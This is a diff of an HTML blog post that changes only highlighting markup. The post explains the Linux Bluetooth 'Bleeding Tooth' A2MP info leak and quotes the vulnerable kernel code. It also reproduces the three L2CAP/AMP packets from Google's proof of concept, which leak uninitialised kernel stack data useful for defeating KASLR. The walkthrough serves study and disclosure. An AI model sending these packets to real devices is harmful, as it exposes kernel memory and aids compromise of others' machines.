@@ -181,38 +181,38 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 <p>The vulnerability itself, dubbed <em>Bleeding Tooth</em> by Google, is able to leak values from the kernel&rsquo;s stack memory. This means that, in theory, you might be able to defeat kaslr and leverage that information in a fully-fledged exploit.</p>
 <h1 id="spot-the-vuln">Spot The Vuln<a href="#spot-the-vuln" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>To start off, it&rsquo;s a good idea to look at the kernel source itself. The vulnerable function is <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L291"><code>a2mp_getinfo_req()</code></a>. Specifically, starting at <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L304">line 304</a>, we have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
-{
-    <span style="color:#66d9ef">struct</span> a2mp_info_rsp rsp;
-
-    rsp.id <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>id;
-    rsp.status <span style="color:#f92672">=</span> A2MP_STATUS_INVALID_CTRL_ID;
-
-    a2mp_send(mgr, A2MP_GETINFO_RSP, hdr<span style="color:#f92672">-&gt;</span>ident, <span style="color:#66d9ef">sizeof</span>(rsp),
-            <span style="color:#f92672">&amp;</span>rsp);
-    
-    <span style="color:#66d9ef">goto</span> done;
-}
-</code></pre></div><p>The problem here is that the <code>rsp</code> struct (defined to be of type <code>a2mp_info_rsp</code>) is declared and then only 2 of it&rsquo;s fields are set before it&rsquo;s sent to the device with <code>a2mp_send()</code>. Taking a look at the <code>a2mp_info_rsp</code> struct definition in <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.h#L77"><code>a2mp.h</code></a>, we see:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> a2mp_info_rsp {
-    __u8        id;
-    __u8        status;
-    __le32      total_bw;
-    __le32      max_bw;
-    __le32      min_latency;
-    __le16      pal_cap;
-    __le16      assoc_size;
-} __packed;
-</code></pre></div><p>The trouble is that space for this struct is allocated on the stack, so the rest of those fields are going to already be populated with junk left over from whatever was going on in that region of memory before. Herein lies the issue - that <em>junk</em> is likely to contain kernel addresses which are being sent over Bluetooth to another device! This is what constitutes the information leak.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> a2mp_info_rsp rsp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rsp.id <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>id;
+</span></span><span style="display:flex;"><span>    rsp.status <span style="color:#f92672">=</span> A2MP_STATUS_INVALID_CTRL_ID;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    a2mp_send(mgr, A2MP_GETINFO_RSP, hdr<span style="color:#f92672">-&gt;</span>ident, <span style="color:#66d9ef">sizeof</span>(rsp),
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;</span>rsp);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> done;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The problem here is that the <code>rsp</code> struct (defined to be of type <code>a2mp_info_rsp</code>) is declared and then only 2 of it&rsquo;s fields are set before it&rsquo;s sent to the device with <code>a2mp_send()</code>. Taking a look at the <code>a2mp_info_rsp</code> struct definition in <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.h#L77"><code>a2mp.h</code></a>, we see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> a2mp_info_rsp {
+</span></span><span style="display:flex;"><span>    __u8        id;
+</span></span><span style="display:flex;"><span>    __u8        status;
+</span></span><span style="display:flex;"><span>    __le32      total_bw;
+</span></span><span style="display:flex;"><span>    __le32      max_bw;
+</span></span><span style="display:flex;"><span>    __le32      min_latency;
+</span></span><span style="display:flex;"><span>    __le16      pal_cap;
+</span></span><span style="display:flex;"><span>    __le16      assoc_size;
+</span></span><span style="display:flex;"><span>} __packed;
+</span></span></code></pre></div><p>The trouble is that space for this struct is allocated on the stack, so the rest of those fields are going to already be populated with junk left over from whatever was going on in that region of memory before. Herein lies the issue - that <em>junk</em> is likely to contain kernel addresses which are being sent over Bluetooth to another device! This is what constitutes the information leak.</p>
 <h1 id="triggering-the-bug">Triggering The Bug<a href="#triggering-the-bug" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>So, a nice bug for sure - but how do we trigger it? Let&rsquo;s take another look at that <code>if</code> statement:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
-{
-    <span style="color:#75715e">/* ... */</span>
-}
-</code></pre></div><p>Okay, first of all <code>req</code> is defined further up in <code>a2mp_getinfo_req()</code> on <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L294">line 294</a> - essentially it&rsquo;s just an incoming Bluetooth packet requesting information about the connection (hence why <code>a2mp_getinfo_req()</code> is being called). The first line takes the request ID from <code>req</code> and passes it to <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/hci_core.c#L1004"><code>hci_dev_get()</code></a>, which returns an <a href="https://github.com/torvalds/linux/blob/9ff9b0d392ea08090cd1780fb196f36dbb586529/include/net/bluetooth/hci_core.h#L283"><code>hci_dev</code></a> struct (this function takes care of obtaining a pointer to the contents of the packet without us having to worry about the lower levels of the stack).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ... */</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Okay, first of all <code>req</code> is defined further up in <code>a2mp_getinfo_req()</code> on <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L294">line 294</a> - essentially it&rsquo;s just an incoming Bluetooth packet requesting information about the connection (hence why <code>a2mp_getinfo_req()</code> is being called). The first line takes the request ID from <code>req</code> and passes it to <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/hci_core.c#L1004"><code>hci_dev_get()</code></a>, which returns an <a href="https://github.com/torvalds/linux/blob/9ff9b0d392ea08090cd1780fb196f36dbb586529/include/net/bluetooth/hci_core.h#L283"><code>hci_dev</code></a> struct (this function takes care of obtaining a pointer to the contents of the packet without us having to worry about the lower levels of the stack).</p>
 <p><code>HCI</code> stands for <em>Host-Controller Interface</em> and is (roughly-speaking) the separator between the messy physical and data-link layers, and the rest of the Bluetooth stack. Fortunately, there&rsquo;s a handy protocol for passing frames back and forth between the HCI and the upper levels, which is called <em>Logical Link Control and Adaption Protocol</em>, or <code>L2CAP</code> to it&rsquo;s friends. This is the protocol that will be used to communicate with the target device.</p>
 <p>So, what is that <code>if</code> statement checking? Well, <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/hci_core.c#L1004">we can see that</a> <code>hci_dev_get()</code> returns a pointer to an <code>hci_dev</code> struct, so the <code>!hdev</code> condition is just making sure that we actually have a pointer <em>to something</em>. Next, the <a href="https://github.com/torvalds/linux/blob/9ff9b0d392ea08090cd1780fb196f36dbb586529/include/net/bluetooth/hci_core.h#L291"><code>dev_type</code></a> field of an <code>hci_dev</code> struct is just the kind of Bluetooth packet we have - in this case, it&rsquo;s checking whether it is of type <code>HCI_AMP</code>. <code>AMP</code> stands for <em>Alternative MAC/PHY</em> and is a clever (although optionally implemented) feature of Bluetooth 3.0 which is able to use 802.11abgn to transfer data, while keeping Bluetooth as a kind of control channel (this is cool because many devices have a single wireless chip than handles both WiFi and Bluetooth).</p>
 <p>Essentially, as long as we have a valid Bluetooth packet, which is <em>not</em> an AMP packet, we&rsquo;ll trigger the bug! The only trick is that we have to get the kernel to actually enter the <code>a2mp_getinfo_req()</code>, which will only happen if an AMP channel is created, and an AMP info request is received&hellip;</p>
@@ -226,64 +226,64 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 </ul>
 <p>This is precisely what the Google team&rsquo;s <a href="https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq">poc</a> does. The first thing it does is resets the Bluetooth device, and the initiates a connection to the target MAC address. After all that is done, we get to constructing and sending the three packets.</p>
 <p>Now comes packet 1:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;[*] Creating AMP channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-<span style="color:#66d9ef">struct</span> {
-    l2cap_hdr hdr;
-} packet1 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-packet1.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet1) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-packet1.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
-hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet1, <span style="color:#66d9ef">sizeof</span>(packet1));
-</code></pre></div><p>This packet is just an <code>L2CAP</code> header (defined in <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L206"><code>include/net/bluetooth/l2cap.h</code></a>) consisting of a packet length (<code>len</code>) and a channel identifier (<code>cid</code>). This channel identifier is set to <code>AMP_MGR_CID</code> (defined to be <code>0x03</code>). Once this packet is sent, we know that the vulnerable code will eventually be called, but at this point the <code>if</code> statement will fail and we won&rsquo;t get any goodies sent back to us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Creating AMP channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
+</span></span><span style="display:flex;"><span>} packet1 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>packet1.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet1) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet1.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet1, <span style="color:#66d9ef">sizeof</span>(packet1));
+</span></span></code></pre></div><p>This packet is just an <code>L2CAP</code> header (defined in <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L206"><code>include/net/bluetooth/l2cap.h</code></a>) consisting of a packet length (<code>len</code>) and a channel identifier (<code>cid</code>). This channel identifier is set to <code>AMP_MGR_CID</code> (defined to be <code>0x03</code>). Once this packet is sent, we know that the vulnerable code will eventually be called, but at this point the <code>if</code> statement will fail and we won&rsquo;t get any goodies sent back to us.</p>
 <p>Moving onwards, we get to packet 2:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;[*] Configuring to L2CAP_MODE_BASIC...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-<span style="color:#66d9ef">struct</span> {
-    l2cap_hdr hdr;
-    l2cap_cmd_hdr cmd_hdr;
-    l2cap_conf_rsp conf_rsp;
-    l2cap_conf_opt conf_opt;
-    l2cap_conf_rfc conf_rfc;
-} packet2 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-packet2.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-packet2.hdr.cid <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">1</span>);
-packet2.cmd_hdr.code <span style="color:#f92672">=</span> L2CAP_CONF_RSP;
-packet2.cmd_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
-packet2.cmd_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE <span style="color:#f92672">-</span> L2CAP_CMD_HDR_SIZE);
-packet2.conf_rsp.scid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
-packet2.conf_rsp.flags <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">0</span>);
-packet2.conf_rsp.result <span style="color:#f92672">=</span> htobs(L2CAP_CONF_UNACCEPT);
-packet2.conf_opt.type <span style="color:#f92672">=</span> L2CAP_CONF_RFC;
-packet2.conf_opt.len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(l2cap_conf_rfc);
-packet2.conf_rfc.mode <span style="color:#f92672">=</span> L2CAP_MODE_BASIC;
-hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet2, <span style="color:#66d9ef">sizeof</span>(packet2));
-</code></pre></div><p>Before we can send a corrupt AMP packet with a nonsense request ID, we have to establish with the target that we&rsquo;re using the L2CAP protocol. This packet has a lot of fields that we don&rsquo;t really care about, but the important struct to look at is <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L349"><code>l2cap_conf_rfc</code></a>. This is where the protocol is actually set (although, given the rest of the packet, anything other than L2CAP wouldn&rsquo;t make any sense). We can see this on the penultimate line where the <code>.mode</code> field of <code>conf_rfc</code> is set to <code>L2CAP_MODE_BASIC</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Configuring to L2CAP_MODE_BASIC...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
+</span></span><span style="display:flex;"><span>    l2cap_cmd_hdr cmd_hdr;
+</span></span><span style="display:flex;"><span>    l2cap_conf_rsp conf_rsp;
+</span></span><span style="display:flex;"><span>    l2cap_conf_opt conf_opt;
+</span></span><span style="display:flex;"><span>    l2cap_conf_rfc conf_rfc;
+</span></span><span style="display:flex;"><span>} packet2 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>packet2.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet2.hdr.cid <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>packet2.cmd_hdr.code <span style="color:#f92672">=</span> L2CAP_CONF_RSP;
+</span></span><span style="display:flex;"><span>packet2.cmd_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>packet2.cmd_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE <span style="color:#f92672">-</span> L2CAP_CMD_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.scid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.flags <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.result <span style="color:#f92672">=</span> htobs(L2CAP_CONF_UNACCEPT);
+</span></span><span style="display:flex;"><span>packet2.conf_opt.type <span style="color:#f92672">=</span> L2CAP_CONF_RFC;
+</span></span><span style="display:flex;"><span>packet2.conf_opt.len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(l2cap_conf_rfc);
+</span></span><span style="display:flex;"><span>packet2.conf_rfc.mode <span style="color:#f92672">=</span> L2CAP_MODE_BASIC;
+</span></span><span style="display:flex;"><span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet2, <span style="color:#66d9ef">sizeof</span>(packet2));
+</span></span></code></pre></div><p>Before we can send a corrupt AMP packet with a nonsense request ID, we have to establish with the target that we&rsquo;re using the L2CAP protocol. This packet has a lot of fields that we don&rsquo;t really care about, but the important struct to look at is <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L349"><code>l2cap_conf_rfc</code></a>. This is where the protocol is actually set (although, given the rest of the packet, anything other than L2CAP wouldn&rsquo;t make any sense). We can see this on the penultimate line where the <code>.mode</code> field of <code>conf_rfc</code> is set to <code>L2CAP_MODE_BASIC</code>.</p>
 <p>Once this packet is sent, we can send another one with an AMP packet encapsulated in an L2CAP packet, which brings us to packet 3:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;[*] Sending malicious AMP info request...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-<span style="color:#66d9ef">struct</span> {
-    l2cap_hdr hdr;
-    amp_mgr_hdr amp_hdr;
-    amp_info_req_parms info_req;
-} packet3 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-packet3.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet3) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-packet3.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
-packet3.amp_hdr.code <span style="color:#f92672">=</span> AMP_INFO_REQ;
-packet3.amp_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
-packet3.amp_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(amp_info_req_parms));
-packet3.info_req.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>; <span style="color:#75715e">// use a dummy id to make hci_dev_get fail
-</span><span style="color:#75715e"></span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet3, <span style="color:#66d9ef">sizeof</span>(packet3));
-</code></pre></div><p>Notice how, in the definition of <code>packet3</code>, we start off with an <code>l2cap_hdr</code>, followed by an <code>amp_mgr_hdr</code> and an <code>amp_info_req_parms</code> payload. We can only do this because we sent <code>packet2</code>, which instructed the target device that we are using <code>l2cap</code> to encapsulate our packets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Sending malicious AMP info request...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
+</span></span><span style="display:flex;"><span>    amp_mgr_hdr amp_hdr;
+</span></span><span style="display:flex;"><span>    amp_info_req_parms info_req;
+</span></span><span style="display:flex;"><span>} packet3 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>packet3.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet3) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet3.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span>packet3.amp_hdr.code <span style="color:#f92672">=</span> AMP_INFO_REQ;
+</span></span><span style="display:flex;"><span>packet3.amp_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>packet3.amp_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(amp_info_req_parms));
+</span></span><span style="display:flex;"><span>packet3.info_req.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>; <span style="color:#75715e">// use a dummy id to make hci_dev_get fail
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet3, <span style="color:#66d9ef">sizeof</span>(packet3));
+</span></span></code></pre></div><p>Notice how, in the definition of <code>packet3</code>, we start off with an <code>l2cap_hdr</code>, followed by an <code>amp_mgr_hdr</code> and an <code>amp_info_req_parms</code> payload. We can only do this because we sent <code>packet2</code>, which instructed the target device that we are using <code>l2cap</code> to encapsulate our packets.</p>
 <p>There are two important parts to this packet. First, we set the <code>.code</code> field of the <code>amp_hdr</code> to <code>AMP_INFO_REQ</code> - this ensures that the vulnerable <code>a2mp_getinfo_req()</code> function in the kernel will get called. The second, crucial part of the whole poc, is that we set <code>.id</code> field of the <code>info_req</code> payload to <code>0x42</code>. This number has no inherent meaning in the Bluetooth stack, so when the kernel calls <code>hci_dev_get()</code> on this packet, it will get a valid pointer back, but the <code>.dev_type</code> field of <code>hdev</code> will <em>not</em> be <code>HCI_AMP</code>. This will make the <code>if</code> condition fail, and the kernel will jump to the vulnerable code.</p>
 <h1 id="the-goods">The Goods<a href="#the-goods" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>So what happens once we&rsquo;ve sent these three packets? The target Bluetooth device sends back an AMP response to the &ldquo;info request&rdquo; that we sent it. As explained at the start, the first two fields are appropriately set, but the rest aren&rsquo;t. Looking at the <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/net/bluetooth/a2mp.h#L77"><code>a2mp_info_rsp</code></a> struct again:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> a2mp_info_rsp {
-    __u8        id;
-    __u8        status;
-    __le32      total_bw;
-    __le32      max_bw;
-    __le32      min_latency;
-    __le16      pal_cap;
-    __le16      assoc_size;
-} __packed;
-</code></pre></div><p>The first two fields, <code>.id</code> and <code>.status</code>, are the ones that get filled. Immediately following them are three <code>__le32</code> fields (which are 32-bit little endian numbers). Because the <code>a2mp_info_rsp</code> struct is allocated on the stack (see <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L306">here</a>), these three values (<code>.total_bw</code>, <code>.max_bw</code>, <code>.min_latency</code>) are likely to already have values in memory regions that they occupy - which get sent back to us over Bluetooth!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> a2mp_info_rsp {
+</span></span><span style="display:flex;"><span>    __u8        id;
+</span></span><span style="display:flex;"><span>    __u8        status;
+</span></span><span style="display:flex;"><span>    __le32      total_bw;
+</span></span><span style="display:flex;"><span>    __le32      max_bw;
+</span></span><span style="display:flex;"><span>    __le32      min_latency;
+</span></span><span style="display:flex;"><span>    __le16      pal_cap;
+</span></span><span style="display:flex;"><span>    __le16      assoc_size;
+</span></span><span style="display:flex;"><span>} __packed;
+</span></span></code></pre></div><p>The first two fields, <code>.id</code> and <code>.status</code>, are the ones that get filled. Immediately following them are three <code>__le32</code> fields (which are 32-bit little endian numbers). Because the <code>a2mp_info_rsp</code> struct is allocated on the stack (see <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L306">here</a>), these three values (<code>.total_bw</code>, <code>.max_bw</code>, <code>.min_latency</code>) are likely to already have values in memory regions that they occupy - which get sent back to us over Bluetooth!</p>
 <h1 id="whats-the-big-deal">What&rsquo;s the big deal?<a href="#whats-the-big-deal" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Ordinarily, kernel memory is only readable from within the kernel itself - and it gets to choose what things to expose to userland. For instance, a privileged user is allowed to see the memory address of all the exported kernel objects by reading from <code>/proc/kallsyms</code>, however it is still not allowed to <em>read</em> from those addresses.</p>
 <p>One big reason that things are done this way is <em>kaslr</em>, or &ldquo;kernel address space layout randomization&rdquo;. This is a technique to randomize the location that the kernel gets loaded into at each boot, so that the location of different kernel objects isn&rsquo;t always the same - and are essentialy unpredictable. Lots of kernel exploits are foiled because of this (for instance, ROP chains are useless because you&rsquo;re not able to predict where any gadgets are), but if I&rsquo;m able to leak information from kernel memory, then it&rsquo;s possible that I might be able to discover the location of an object in memory.</p>
